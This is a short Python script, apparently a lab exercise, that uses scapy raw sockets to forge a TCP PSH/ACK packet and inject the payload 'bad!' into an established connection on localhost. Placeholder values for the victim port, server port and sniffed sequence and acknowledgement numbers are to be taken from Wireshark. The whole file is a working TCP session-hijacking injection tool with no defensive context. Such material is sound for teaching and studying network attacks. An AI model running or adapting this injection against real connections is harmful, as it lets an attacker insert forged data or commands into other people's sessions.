import sys
import scapy3k.all as scapy
import socket
import struct


scapy.conf.L3socket
scapy.conf.L3socket=scapy.L3RawSocket

"""if len(sys.argv)<4:
	print("not enough arguments")
	print("src port of the victim, server port, seq number, ack number")

else:
"""

full_message =  "bad!" # args to be sent to machineA

###### CHANGE THESE WITH THE RIGHT VALUES - you can use Wireshark to get them
sport = 42168 # VICTIM PORT
dport = 4446 # SERVER PORT
seq = 1790383696 # SEQUENCE NUMBER
ack = 1054105548 # ACK NUMBER
######

src=dest="127.0.0.1"
ip=scapy.IP(src=src,dst=dest)
PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=seq,ack=ack)
scapy.send(ip/PHACK/full_message)

# to be nice, you should send the FIN/ACK, ACK pkts now ...
